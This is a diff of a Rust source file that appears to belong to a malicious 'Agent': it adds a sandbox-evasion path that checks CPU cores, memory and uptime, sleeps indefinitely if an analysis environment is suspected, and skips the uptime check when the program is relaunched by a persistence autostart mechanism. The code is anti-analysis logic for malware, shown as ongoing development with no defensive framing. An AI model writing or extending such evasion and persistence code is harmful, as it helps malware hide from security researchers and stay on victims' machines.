@@ -5,8 +5,17 @@ use std::process::Command;
 
 /// Main entry point: returns true if it's safe to execute.
 /// If a sandbox is detected, sleeps indefinitely and returns false.
+/// `skip_uptime`: skip the uptime < 5min check (used when launched from persistence autostart).
 pub fn should_execute() -> bool {
-    if is_sandbox() {
+    should_execute_inner(false)
+}
+
+pub fn should_execute_ex(skip_uptime: bool) -> bool {
+    should_execute_inner(skip_uptime)
+}
+
+fn should_execute_inner(skip_uptime: bool) -> bool {
+    if is_sandbox_ex(skip_uptime) {
         eprintln!("[Agent] Sandbox detected. Sleeping indefinitely.");
         std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
         return false;
@@ -22,7 +31,11 @@ pub fn should_execute() -> bool {
 // ── Sandbox Detection ──────────────────────────────────────────────────
 
 pub fn is_sandbox() -> bool {
-    check_cpu_cores() || check_memory() || check_uptime()
+    is_sandbox_ex(false)
+}
+
+pub fn is_sandbox_ex(skip_uptime: bool) -> bool {
+    check_cpu_cores() || check_memory() || (!skip_uptime && check_uptime())
 }
 
 fn check_cpu_cores() -> bool {
